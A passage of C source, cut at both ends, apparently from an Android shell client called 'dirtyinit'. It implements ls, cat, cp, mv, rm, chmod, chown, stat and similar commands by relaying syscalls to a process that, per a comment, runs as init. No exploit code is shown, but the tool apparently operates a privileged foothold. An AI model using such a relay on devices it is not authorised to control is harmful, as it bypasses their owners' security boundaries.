        int (*chosen_cmp)(const void *, const void *) = NULL;
        if (f->sort_size)
            chosen_cmp = f->sort_reverse ? ls_cmp_size_rev : ls_cmp_size;
        else if (f->sort_time)
            chosen_cmp = f->sort_reverse ? ls_cmp_time_rev : ls_cmp_time;
        else if (f->sort_ext)
            chosen_cmp = f->sort_reverse ? ls_cmp_ext_rev : ls_cmp_ext;
        else
            chosen_cmp = f->sort_reverse ? ls_cmp_name_rev : ls_cmp_name;

        if (f->group_dirs_first) {
            g_ls_inner_cmp = chosen_cmp;
            qsort(entries, (size_t)entry_count, sizeof(struct ls_entry),
                  ls_cmp_dirs_first_wrapper);
        } else {
            qsort(entries, (size_t)entry_count, sizeof(struct ls_entry),
                  chosen_cmp);
        }
    }

    if (f->recursive) printf("%s:\n", abs_path);

    /* ── Output ────────────────────────────────────────────────────────── */
    if (f->fmt_long) {
        ls_print_long(sock, entries, entry_count, abs_path, f);
    } else if (f->fmt_columns || f->fmt_across) {
        ls_print_columns(entries, entry_count, f);
    } else if (f->fmt_comma) {
        /* Comma-separated */
        for (int i = 0; i < entry_count; i++) {
            if (g_sigint) break;
            if (i > 0) printf(", ");
            ls_print_name(&entries[i], f);
            if (f->append_type) {
                char ti = ls_type_indicator(&entries[i]);
                if (ti) putchar(ti);
            } else if (f->append_slash) {
                int is_dir = 0;
                if (entries[i].has_stat)
                    is_dir = ((entries[i].st_mode & 0xF000) == 0x4000);
                else
                    is_dir = (entries[i].dtype == DT_DIR);
                if (is_dir) putchar('/');
            }
        }
        if (entry_count > 0) printf("\n");
    } else {
        /* One per line (-1, default) */
        for (int i = 0; i < entry_count; i++) {
            if (g_sigint) break;

            /* -Z in non-long mode: show context before name */
            if (f->show_selinux && !f->fmt_long) {
                char full_path[CWD_SIZE];
                ls_make_full_path(abs_path, entries[i].name, full_path);
                char ctx[256] = "?";
                relay_lgetxattr(sock, full_path, "security.selinux",
                                ctx, sizeof(ctx) - 1);
                size_t cl = strlen(ctx);
                if (cl > 0 && ctx[cl - 1] == '\0') ctx[cl - 1] = '\0';
                printf("%-40s ", ctx);
            }

            /* Inode prefix */
            if (f->show_inode) {
                if (entries[i].has_stat)
                    printf("%7llu ", (unsigned long long)entries[i].st_ino);
                else
                    printf("      ? ");
            }

            /* Blocks prefix */
            if (f->show_blocks) {
                if (entries[i].has_stat) {
                    int bs = f->block_size > 0 ? f->block_size : 1024;
                    uint64_t bk = (entries[i].st_blocks * 512 + (uint64_t)bs - 1) / (uint64_t)bs;
                    printf("%4llu ", (unsigned long long)bk);
                } else {
                    printf("   ? ");
                }
            }

            ls_print_name(&entries[i], f);

            /* Type indicator / slash */
            if (f->append_type) {
                char ti = ls_type_indicator(&entries[i]);
                if (ti) putchar(ti);
            } else if (f->append_slash) {
                int is_dir = 0;
                if (entries[i].has_stat)
                    is_dir = ((entries[i].st_mode & 0xF000) == 0x4000);
                else
                    is_dir = (entries[i].dtype == DT_DIR);
                if (is_dir) putchar('/');
            }
            printf("\n");
        }
    }

    /* Recursive: enumerate subdirs */
    if (f->recursive) {
        printf("\n");
        for (int i = 0; i < entry_count; i++) {
            if (g_sigint) break;
            int is_dir = 0;
            if (entries[i].has_stat)
                is_dir = ((entries[i].st_mode & 0xF000) == 0x4000);
            else
                is_dir = (entries[i].dtype == DT_DIR);

            if (is_dir &&
                strcmp(entries[i].name, ".") != 0 &&
                strcmp(entries[i].name, "..") != 0) {
                char child[CWD_SIZE];
                ls_make_full_path(abs_path, entries[i].name, child);
                ls_one_dir(sock, child, f);
            }
        }
    }

    free(entries);
    return 0;
}

static int cmd_cd(int sock, int argc, char *argv[]) {
    const char *target = "/";
    if (argc >= 2) target = argv[1];

    char new_cwd[CWD_SIZE];
    resolve_path(target, new_cwd);

    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    int64_t ret = relay_fstatat(sock, new_cwd, statbuf, sizeof(statbuf));
    if (ret < 0) {
        int e = (int)(-(int64_t)ret);
        fprintf(stderr, "cd: %s: %s\n", new_cwd, errno_str(e));
        return 1;
    }

    uint32_t st_mode = unpack_u32(statbuf + 16);
    if ((st_mode & 0xF000) != 0x4000) {
        fprintf(stderr, "cd: %s: Not a directory\n", new_cwd);
        return 1;
    }

    strncpy(g_cwd, new_cwd, CWD_SIZE - 1);
    g_cwd[CWD_SIZE - 1] = '\0';
    return 0;
}

static int cmd_cat(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "cat: missing operand\n");
        return 1;
    }

    int redir_type = 0;
    int redir_idx = find_redirect(argc, argv, &redir_type);
    const char *redir_file = NULL;
    int src_end = argc;

    if (redir_idx > 0 && redir_idx + 1 < argc) {
        redir_file = argv[redir_idx + 1];
        src_end = redir_idx;
    }

    char abs_src[CWD_SIZE];
    resolve_path(argv[1], abs_src);

    int64_t fd = relay_openat(sock, abs_src, MY_O_RDONLY, 0);
    if (fd < 0) {
        int e = (int)(-(int64_t)fd);
        fprintf(stderr, "cat: %s: %s\n", abs_src, errno_str(e));
        return 1;
    }

    int64_t dst_fd = -1;
    if (redir_file) {
        char abs_dst[CWD_SIZE];
        resolve_path(redir_file, abs_dst);
        int oflags = MY_O_WRONLY | MY_O_CREAT;
        if (redir_type == 1) oflags |= MY_O_TRUNC;
        else oflags |= MY_O_APPEND;

        dst_fd = relay_openat(sock, abs_dst, oflags, 0644);
        if (dst_fd < 0) {
            int e = (int)(-(int64_t)dst_fd);
            fprintf(stderr, "cat: %s: %s\n", redir_file, errno_str(e));
            relay_close(sock, fd);
            return 1;
        }
    }

    size_t total = 0;
    for (;;) {
        if (g_sigint) { g_sigint = 0; break; }

        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;

        if (dst_fd >= 0) {
            relay_write(sock, dst_fd, buf, (size_t)n);
        } else {
            fwrite(buf, 1, (size_t)n, stdout);
        }
        total += (size_t)n;

        if ((size_t)n < DATA_SIZE) break;
    }

    relay_close(sock, fd);
    if (dst_fd >= 0) relay_close(sock, dst_fd);

    if (!redir_file) fflush(stdout);

    (void)src_end;
    (void)total;
    return 0;
}

/* Check if path is an existing directory via relay_fstatat */
static int is_directory(int sock, const char *path) {
    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    if (relay_fstatat(sock, path, statbuf, sizeof(statbuf)) < 0)
        return 0;
    return (unpack_u32(statbuf + 16) & 0xF000) == 0x4000;
}

/* Extract basename from src_path and append to dst_dir.
 * e.g. dst_dir="/data/media/0", src_path="/system/foo/bar.txt"
 * => dst_buf="/data/media/0/bar.txt"
 */
static void append_basename(char *dst_buf, size_t dst_size,
                            const char *dst_dir, const char *src_path) {
    const char *base = strrchr(src_path, '/');
    if (base)
        base++;  /* skip the '/' */
    else
        base = src_path;  /* no slash, entire string is the basename */
    snprintf(dst_buf, dst_size, "%s/%s", dst_dir, base);
}

static void cp_file(int sock, const char *src, const char *dst) {
    int64_t src_fd = relay_openat(sock, src, MY_O_RDONLY, 0);
    if (src_fd < 0) {
        fprintf(stderr, "cp: cannot open '%s': %s\n", src, errno_str((int)(-src_fd)));
        return;
    }
    int64_t dst_fd = relay_openat(sock, dst, MY_O_WRONLY | MY_O_CREAT | MY_O_TRUNC, 0644);
    if (dst_fd < 0) {
        fprintf(stderr, "cp: cannot create '%s': %s\n", dst, errno_str((int)(-dst_fd)));
        relay_close(sock, src_fd);
        return;
    }
    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, src_fd, buf, DATA_SIZE);
        if (n <= 0) break;
        int64_t w = relay_write(sock, dst_fd, buf, (size_t)n);
        if (w < 0) { fprintf(stderr, "cp: write error: %s\n", errno_str((int)(-w))); break; }
        if ((size_t)n < DATA_SIZE) break;
    }
    relay_close(sock, src_fd);
    relay_close(sock, dst_fd);
}

static void cp_recursive(int sock, const char *src, const char *dst);

static void cp_recursive(int sock, const char *src, const char *dst) {
    if (g_sigint) return;
    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));
    if (relay_fstatat(sock, src, statbuf, sizeof(statbuf)) < 0) return;

    uint32_t mode = unpack_u32(statbuf + 16);
    if ((mode & 0xF000) != 0x4000) {
        cp_file(sock, src, dst);
        return;
    }

    relay_mkdirat(sock, dst, mode & 07777);

    int64_t fd = relay_openat(sock, src, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return;

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) break;
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;
            if (strcmp(d_name, ".") != 0 && strcmp(d_name, "..") != 0) {
                char child_src[CWD_SIZE], child_dst[CWD_SIZE];
                snprintf(child_src, CWD_SIZE, "%s/%s", src, d_name);
                snprintf(child_dst, CWD_SIZE, "%s/%s", dst, d_name);
                cp_recursive(sock, child_src, child_dst);
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
}

static int cmd_cp(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "cp: missing operand\nUsage: cp [-r] <source> <destination>\n");
        return 1;
    }

    int recursive = 0;
    const char *src_arg = NULL;
    const char *dst_arg = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'r' || *f == 'R') recursive = 1;
            }
        } else if (!src_arg) {
            src_arg = argv[i];
        } else {
            dst_arg = argv[i];
        }
    }

    if (!src_arg || !dst_arg) {
        fprintf(stderr, "cp: missing operand\nUsage: cp [-r] <source> <destination>\n");
        return 1;
    }

    /* Check trailing slash on raw arg BEFORE resolve_path strips it */
    size_t raw_dst_len = strlen(dst_arg);
    int dst_trailing_slash = (raw_dst_len > 1 && dst_arg[raw_dst_len - 1] == '/');

    char abs_src[CWD_SIZE], abs_dst[CWD_SIZE];
    resolve_path(src_arg, abs_src);
    resolve_path(dst_arg, abs_dst);

    /* If dst is an existing directory (or user typed trailing '/'), copy INTO it */
    if (dst_trailing_slash || is_directory(sock, abs_dst)) {
        char final_dst[CWD_SIZE];
        append_basename(final_dst, CWD_SIZE, abs_dst, abs_src);
        if (recursive) {
            cp_recursive(sock, abs_src, final_dst);
        } else {
            cp_file(sock, abs_src, final_dst);
        }
    } else {
        if (recursive) {
            cp_recursive(sock, abs_src, abs_dst);
        } else {
            cp_file(sock, abs_src, abs_dst);
        }
    }
    return 0;
}

static int cmd_mv(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "mv: missing operand\nUsage: mv <source> <destination>\n");
        return 1;
    }

    /* Check trailing slash on raw arg BEFORE resolve_path strips it */
    size_t raw_mv_dst_len = strlen(argv[2]);
    int mv_dst_trailing_slash = (raw_mv_dst_len > 1 && argv[2][raw_mv_dst_len - 1] == '/');

    char abs_src[CWD_SIZE], abs_dst[CWD_SIZE];
    resolve_path(argv[1], abs_src);
    resolve_path(argv[2], abs_dst);

    /* If dst is an existing directory (or user typed trailing '/'), move INTO it */
    if (mv_dst_trailing_slash || is_directory(sock, abs_dst)) {
        char final_dst[CWD_SIZE];
        append_basename(final_dst, CWD_SIZE, abs_dst, abs_src);
        memcpy(abs_dst, final_dst, CWD_SIZE);
    }

    int64_t src_fd = relay_openat(sock, abs_src, MY_O_RDONLY, 0);
    if (src_fd < 0) {
        fprintf(stderr, "mv: cannot open '%s': %s\n", abs_src, errno_str((int)(-src_fd)));
        return 1;
    }

    int64_t dst_fd = relay_openat(sock, abs_dst, MY_O_WRONLY | MY_O_CREAT | MY_O_TRUNC, 0644);
    if (dst_fd < 0) {
        fprintf(stderr, "mv: cannot create '%s': %s\n", abs_dst, errno_str((int)(-dst_fd)));
        relay_close(sock, src_fd);
        return 1;
    }

    int copy_ok = 1;
    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, src_fd, buf, DATA_SIZE);
        if (n <= 0) break;

        int64_t w = relay_write(sock, dst_fd, buf, (size_t)n);
        if (w < 0) { copy_ok = 0; break; }
        if ((size_t)n < DATA_SIZE) break;
    }

    relay_close(sock, src_fd);
    relay_close(sock, dst_fd);

    if (copy_ok) {
        relay_unlinkat(sock, abs_src, 0);
    } else {
        fprintf(stderr, "mv: copy failed, source not removed\n");
    }
    return copy_ok ? 0 : 1;
}

/* rm helpers */
static void rm_recursive(int sock, const char *path);

static void rm_dir_contents(int sock, const char *dirpath) {
    int64_t fd = relay_openat(sock, dirpath, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return;

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            uint8_t d_type = buf[pos + 18];
            const char *d_name = (const char *)(buf + pos + 19);

            if (d_reclen == 0) { nbytes = 0; break; }

            if (strcmp(d_name, ".") != 0 && strcmp(d_name, "..") != 0) {
                char child[CWD_SIZE];
                snprintf(child, CWD_SIZE, "%s/%s", dirpath, d_name);

                if (d_type == DT_DIR) {
                    rm_recursive(sock, child);
                } else {
                    int64_t ret = relay_unlinkat(sock, child, 0);
                    if (ret < 0) {
                        fprintf(stderr, "rm: cannot remove '%s': %s\n",
                                child, errno_str((int)(-ret)));
                    }
                }
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
}

static void rm_recursive(int sock, const char *path) {
    rm_dir_contents(sock, path);
    int64_t ret = relay_unlinkat(sock, path, MY_AT_REMOVEDIR);
    if (ret < 0) {
        fprintf(stderr, "rm: cannot remove '%s': %s\n", path, errno_str((int)(-ret)));
    }
}

static int cmd_rm(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "rm: missing operand\n"); return 1; }

    int recursive = 0, force = 0;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'r' || *f == 'R') recursive = 1;
                else if (*f == 'f') force = 1;
            }
        }
    }

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') continue;
        char abs_path[CWD_SIZE];
        resolve_path(argv[i], abs_path);

        if (recursive) {
            rm_recursive(sock, abs_path);
        } else {
            int64_t ret = relay_unlinkat(sock, abs_path, 0);
            if (ret < 0 && !force) {
                fprintf(stderr, "rm: cannot remove '%s': %s\n",
                        abs_path, errno_str((int)(-ret)));
            }
        }
    }
    (void)force;
    return 0;
}

static void mkdir_parents(int sock, const char *path, int mode) {
    char tmp[CWD_SIZE];
    strncpy(tmp, path, CWD_SIZE - 1);
    tmp[CWD_SIZE - 1] = '\0';

    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            relay_mkdirat(sock, tmp, mode);
            *p = '/';
        }
    }
    relay_mkdirat(sock, tmp, mode);
}

static int cmd_mkdir(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "mkdir: missing operand\n"); return 1; }

    int parents = 0;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'p') parents = 1;
            }
        }
    }

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') continue;
        char abs_path[CWD_SIZE];
        resolve_path(argv[i], abs_path);

        if (parents) {
            mkdir_parents(sock, abs_path, 0755);
        } else {
            int64_t ret = relay_mkdirat(sock, abs_path, 0755);
            if (ret < 0) {
                fprintf(stderr, "mkdir: cannot create directory '%s': %s\n",
                        abs_path, errno_str((int)(-ret)));
            }
        }
    }
    return 0;
}

static void chmod_recursive(int sock, const char *path, int mode);

static void chmod_recursive(int sock, const char *path, int mode) {
    relay_fchmodat(sock, path, mode);

    int64_t fd = relay_openat(sock, path, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return;

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) { relay_close(sock, fd); return; }
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            uint8_t d_type = buf[pos + 18];
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;
            if (strcmp(d_name, ".") != 0 && strcmp(d_name, "..") != 0) {
                char child[CWD_SIZE];
                snprintf(child, CWD_SIZE, "%s/%s", path, d_name);
                if (d_type == DT_DIR)
                    chmod_recursive(sock, child, mode);
                else
                    relay_fchmodat(sock, child, mode);
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
}

static int cmd_chmod(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "chmod: missing operand\nUsage: chmod [-R] <mode> <path>\n");
        return 1;
    }

    int recursive = 0;
    const char *mode_str = NULL;
    const char *path_str = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'R') recursive = 1;
            }
        } else if (!mode_str) {
            mode_str = argv[i];
        } else {
            path_str = argv[i];
        }
    }

    if (!mode_str || !path_str) {
        fprintf(stderr, "chmod: missing operand\nUsage: chmod [-R] <mode> <path>\n");
        return 1;
    }

    unsigned int mode = 0;
    for (const char *p = mode_str; *p; p++) {
        if (*p < '0' || *p > '7') {
            fprintf(stderr, "chmod: invalid mode: '%s'\n", mode_str);
            return 1;
        }
        mode = (mode << 3) | (unsigned int)(*p - '0');
    }

    char abs_path[CWD_SIZE];
    resolve_path(path_str, abs_path);

    if (recursive) {
        chmod_recursive(sock, abs_path, (int)mode);
    } else {
        int64_t ret = relay_fchmodat(sock, abs_path, (int)mode);
        if (ret < 0) {
            fprintf(stderr, "chmod: changing permissions of '%s': %s\n",
                    abs_path, errno_str((int)(-ret)));
            return 1;
        }
    }
    return 0;
}

static void chown_recursive(int sock, const char *path, uint32_t uid, uint32_t gid);

static void chown_recursive(int sock, const char *path, uint32_t uid, uint32_t gid) {
    relay_fchownat(sock, path, uid, gid);

    int64_t fd = relay_openat(sock, path, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return;

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) { relay_close(sock, fd); return; }
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            uint8_t d_type = buf[pos + 18];
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;
            if (strcmp(d_name, ".") != 0 && strcmp(d_name, "..") != 0) {
                char child[CWD_SIZE];
                snprintf(child, CWD_SIZE, "%s/%s", path, d_name);
                if (d_type == DT_DIR)
                    chown_recursive(sock, child, uid, gid);
                else
                    relay_fchownat(sock, child, uid, gid);
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
}

static int cmd_chown(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "chown: missing operand\nUsage: chown [-R] <uid:gid> <path>\n");
        return 1;
    }

    int recursive = 0;
    const char *owner_str = NULL;
    const char *path_str = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'R') recursive = 1;
            }
        } else if (!owner_str) {
            owner_str = argv[i];
        } else {
            path_str = argv[i];
        }
    }

    if (!owner_str || !path_str) {
        fprintf(stderr, "chown: missing operand\nUsage: chown [-R] <uid:gid> <path>\n");
        return 1;
    }

    uint32_t uid = 0, gid = 0;
    char owner_copy[64];
    strncpy(owner_copy, owner_str, sizeof(owner_copy) - 1);
    owner_copy[sizeof(owner_copy) - 1] = '\0';

    char *sep = strchr(owner_copy, ':');
    if (!sep) sep = strchr(owner_copy, '.');
    if (!sep) {
        fprintf(stderr, "chown: invalid owner: '%s' (use uid:gid)\n", owner_str);
        return 1;
    }

    *sep = '\0';
    uid = (uint32_t)strtoul(owner_copy, NULL, 10);
    gid = (uint32_t)strtoul(sep + 1, NULL, 10);

    char abs_path[CWD_SIZE];
    resolve_path(path_str, abs_path);

    if (recursive) {
        chown_recursive(sock, abs_path, uid, gid);
    } else {
        int64_t ret = relay_fchownat(sock, abs_path, uid, gid);
        if (ret < 0) {
            fprintf(stderr, "chown: changing ownership of '%s': %s\n",
                    abs_path, errno_str((int)(-ret)));
            return 1;
        }
    }
    return 0;
}

static int cmd_stat(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "stat: missing operand\n"); return 1; }

    /* --- Parse -c FORMAT flag ---
     * Toybox accepts: stat -c '%u %g' PATH  or  stat -c'%u %g' PATH
     * The format string may be the suffix of -c (concatenated) or the next argv.
     * The path is always the LAST non-consumed argument.
     * RootBrowseDomainManager.java:530 sends: stat -c '%u %g %a %s %Y %F' PATH */
    const char *fmt = NULL;
    const char *path_arg = NULL;
    {
        int i = 1;
        while (i < argc) {
            if (argv[i][0] == '-' && argv[i][1] == 'c') {
                if (argv[i][2] != '\0') {
                    /* -cFORMAT (concatenated) — format string starts at offset 2 */
                    fmt = &argv[i][2];
                } else if (i + 1 < argc) {
                    /* -c FORMAT (separate argv) */
                    fmt = argv[++i];
                }
            } else {
                /* Not a flag — treat as the path (last one wins, matching toybox) */
                path_arg = argv[i];
            }
            i++;
        }
    }
    if (!path_arg) { fprintf(stderr, "stat: missing operand\n"); return 1; }

    char abs_path[CWD_SIZE];
    resolve_path(path_arg, abs_path);

    uint8_t statbuf[128];
    memset(statbuf, 0, sizeof(statbuf));

    int64_t ret = relay_fstatat(sock, abs_path, statbuf, sizeof(statbuf));
    if (ret < 0) {
        fprintf(stderr, "stat: cannot stat '%s': %s\n", abs_path, errno_str((int)(-ret)));
        return 1;
    }

    uint64_t st_dev    = unpack_u64(statbuf + 0);
    uint64_t st_ino    = unpack_u64(statbuf + 8);
    uint32_t st_mode   = unpack_u32(statbuf + 16);
    uint32_t st_nlink  = unpack_u32(statbuf + 20);
    uint32_t st_uid    = unpack_u32(statbuf + 24);
    uint32_t st_gid    = unpack_u32(statbuf + 28);
    uint64_t st_size   = unpack_u64(statbuf + 48);
    uint64_t st_blocks = unpack_u64(statbuf + 64);
    uint64_t st_atime  = unpack_u64(statbuf + 72);
    uint64_t st_mtime  = unpack_u64(statbuf + 88);
    uint64_t st_ctime  = 0;
    if (sizeof(statbuf) >= 112) {
        st_ctime = unpack_u64(statbuf + 104);
    }

    /* --- Format-string output mode (-c FORMAT) ---
     * Iterates the format string char by char. On '%', reads the next char
     * and emits the matching stat field. All other characters pass through
     * literally (spaces, quotes, etc.). Trailing newline appended to match
     * toybox 0.8.12-android behavior. */
    if (fmt) {
        const char *p = fmt;
        while (*p) {
            if (*p == '%' && *(p + 1)) {
                p++;
                switch (*p) {
                    case 'a':
                        /* Access rights in octal (e.g., 755) — st_mode & 07777 */
                        printf("%o", st_mode & 07777);
                        break;
                    case 'A': {
                        /* Access rights as flags string (e.g., drwxr-xr-x) */
                        char mode_str[12];
                        format_mode(st_mode, mode_str);
                        printf("%s", mode_str);
                        break;
                    }
                    case 'F': {
                        /* File type string — matches toybox's lowercase type names */
                        const char *ftype = "regular file";
                        switch (st_mode & 0xF000) {
                            case 0x4000: ftype = "directory"; break;
                            case 0xA000: ftype = "symbolic link"; break;
                            case 0x2000: ftype = "character device"; break;
                            case 0x6000: ftype = "block device"; break;
                            case 0xC000: ftype = "socket"; break;
                            case 0x1000: ftype = "FIFO/pipe"; break;
                        }
                        printf("%s", ftype);
                        break;
                    }
                    case 'g':
                        /* Group ID (decimal) */
                        printf("%u", st_gid);
                        break;
                    case 'G':
                        /* Group name — dirtyinit has no getgrgid, emit GID as string */
                        printf("%u", st_gid);
                        break;
                    case 'h':
                        /* Hard link count */
                        printf("%u", st_nlink);
                        break;
                    case 'i':
                        /* Inode number */
                        printf("%llu", (unsigned long long)st_ino);
                        break;
                    case 'n':
                        /* File name (the resolved absolute path) */
                        printf("%s", abs_path);
                        break;
                    case 's':
                        /* Size in bytes */
                        printf("%llu", (unsigned long long)st_size);
                        break;
                    case 'u':
                        /* User ID (decimal) */
                        printf("%u", st_uid);
                        break;
                    case 'U':
                        /* User name — dirtyinit has no getpwuid, emit UID as string */
                        printf("%u", st_uid);
                        break;
                    case 'X':
                        /* Access time (unix epoch seconds) */
                        printf("%llu", (unsigned long long)st_atime);
                        break;
                    case 'Y':
                        /* Modification time (unix epoch seconds) */
                        printf("%llu", (unsigned long long)st_mtime);
                        break;
                    case 'Z':
                        /* Change/creation time (unix epoch seconds) */
                        printf("%llu", (unsigned long long)st_ctime);
                        break;
                    case 'C': {
                        /* SELinux context via relay lgetxattr — the relay executes
                         * lgetxattr as init so it sees the real label, not our shell's */
                        char ctx[256];
                        memset(ctx, 0, sizeof(ctx));
                        int64_t xr = relay_lgetxattr(sock, abs_path,
                            "security.selinux", ctx, sizeof(ctx) - 1);
                        if (xr > 0) {
                            /* Strip trailing NUL that the kernel includes in the xattr */
                            if (xr > 0 && ctx[xr - 1] == '\0') xr--;
                            ctx[xr] = '\0';
                            printf("%s", ctx);
                        } else {
                            printf("?");
                        }
                        break;
                    }
                    case '%':
                        /* Literal percent sign */
                        putchar('%');
                        break;
                    default:
                        /* Unknown specifier — emit literally (percent + char) to avoid
                         * silently swallowing user's format string content */
                        putchar('%');
                        putchar(*p);
                        break;
                }
            } else {
                /* Non-format character — pass through literally (spaces, quotes, etc.) */
                putchar(*p);
            }
            p++;
        }
        /* Trailing newline matches toybox behavior — the format string itself
         * does not include one, but stat always appends it */
        putchar('\n');
        return 0;
    }

    /* --- Default verbose output (no -c flag) ---
     * Preserved exactly as before for backward compatibility with interactive use */
    char mode_str[12];
    format_mode(st_mode, mode_str);

    char atime_str[32], mtime_str[32], ctime_str[32];
    format_time(st_atime, atime_str, sizeof(atime_str));
    format_time(st_mtime, mtime_str, sizeof(mtime_str));
    format_time(st_ctime, ctime_str, sizeof(ctime_str));

    const char *type_str = "regular file";
    switch (st_mode & 0xF000) {
        case 0x4000: type_str = "directory"; break;
        case 0xA000: type_str = "symbolic link"; break;
        case 0x2000: type_str = "character device"; break;
        case 0x6000: type_str = "block device"; break;
        case 0xC000: type_str = "socket"; break;
        case 0x1000: type_str = "FIFO/pipe"; break;
    }

    printf("  File: %s\n", abs_path);
    printf("  Size: %-15llu Blocks: %-10llu IO Block: 4096   %s\n",
           (unsigned long long)st_size, (unsigned long long)st_blocks, type_str);
    printf("Device: %llxh   Inode: %-12llu Links: %u\n",
           (unsigned long long)st_dev, (unsigned long long)st_ino, st_nlink);
    printf("Access: (%04o/%s)  Uid: %5u   Gid: %5u\n",
           st_mode & 07777, mode_str, st_uid, st_gid);
    printf("Access: %s\n", atime_str);
    printf("Modify: %s\n", mtime_str);
    printf("Change: %s\n", ctime_str);
    return 0;
}

static int cmd_touch(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "touch: missing operand\n"); return 1; }

    for (int i = 1; i < argc; i++) {
        char abs_path[CWD_SIZE];
        resolve_path(argv[i], abs_path);

        int64_t fd = relay_openat(sock, abs_path, MY_O_WRONLY | MY_O_CREAT, 0644);
        if (fd < 0) {
            fprintf(stderr, "touch: cannot touch '%s': %s\n",
                    abs_path, errno_str((int)(-fd)));
            continue;
        }
        relay_close(sock, fd);
    }
    return 0;
}

static int cmd_echo(int sock, int argc, char *argv[]) {
    int redir_type = 0;
    int redir_idx = find_redirect(argc, argv, &redir_type);
    const char *redir_file = NULL;
    int text_end = argc;

    if (redir_idx > 0 && redir_idx + 1 < argc) {
        redir_file = argv[redir_idx + 1];
        text_end = redir_idx;
    }

    char text[DATA_SIZE];
    text[0] = '\0';
    for (int i = 1; i < text_end; i++) {
        if (i > 1) strncat(text, " ", DATA_SIZE - strlen(text) - 1);
        strncat(text, argv[i], DATA_SIZE - strlen(text) - 1);
    }
    strncat(text, "\n", DATA_SIZE - strlen(text) - 1);

    if (!redir_file) {
        printf("%s", text);
        return 0;
    }

    char abs_dst[CWD_SIZE];
    resolve_path(redir_file, abs_dst);

    int oflags = MY_O_WRONLY | MY_O_CREAT;
    if (redir_type == 1) oflags |= MY_O_TRUNC;
    else oflags |= MY_O_APPEND;

    int64_t fd = relay_openat(sock, abs_dst, oflags, 0644);
    if (fd < 0) {
        fprintf(stderr, "echo: %s: %s\n", abs_dst, errno_str((int)(-fd)));
        return 1;
    }

    relay_write(sock, fd, text, strlen(text));
    relay_close(sock, fd);
    return 0;
}

static int cmd_id(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    int64_t uid  = send_syscall(sock, SYS_getuid,  0,0,0,0,0,0, 0, NULL,0, NULL,0);
    int64_t gid  = send_syscall(sock, SYS_getgid,  0,0,0,0,0,0, 0, NULL,0, NULL,0);
    int64_t euid = send_syscall(sock, SYS_geteuid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);
    int64_t egid = send_syscall(sock, SYS_getegid, 0,0,0,0,0,0, 0, NULL,0, NULL,0);

    const char *uname = uid_name((uint32_t)uid);
    const char *gname = uid_name((uint32_t)gid);

    if (uname) printf("uid=%lld(%s)", (long long)uid, uname);
    else printf("uid=%lld", (long long)uid);

    if (gname) printf(" gid=%lld(%s)", (long long)gid, gname);
